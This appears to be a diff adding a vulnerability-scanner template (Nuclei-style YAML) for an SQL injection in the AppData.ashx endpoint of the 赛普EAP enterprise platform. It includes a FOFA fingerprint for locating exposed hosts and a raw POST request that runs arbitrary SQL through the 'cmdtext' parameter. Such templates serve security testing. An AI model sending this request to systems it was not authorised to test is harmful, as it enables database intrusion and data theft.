@@ -1,0 +1,26 @@
+id: saipu-eap-appdata-ashx-sql-injection
+info:
+  name: 赛普EAP企业适配管理平台AppData.ashx SQL注入
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="IDWebSoft" || title="RMS房地产管理系统" || title="赛普EAP企业适配管理平台"
+    经检测，赛普EAP企业适配管理平台的AppData.ashx组件在处理请求参数时存在SQL注入缺陷。攻击者利用该漏洞可绕过输入验证，执行任意SQL命令，从而导致数据库中的敏感数据泄露。
+  tags: 赛普EAP
+http:
+- raw:
+  - |
+    POST /IDWebSoft/AppData.ashx HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    action=GetDataTableByText&cmdtext=SELECT sys.fn_sqlvarbasetostr(HASHBYTES('MD5', '123'));
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - a0b9238
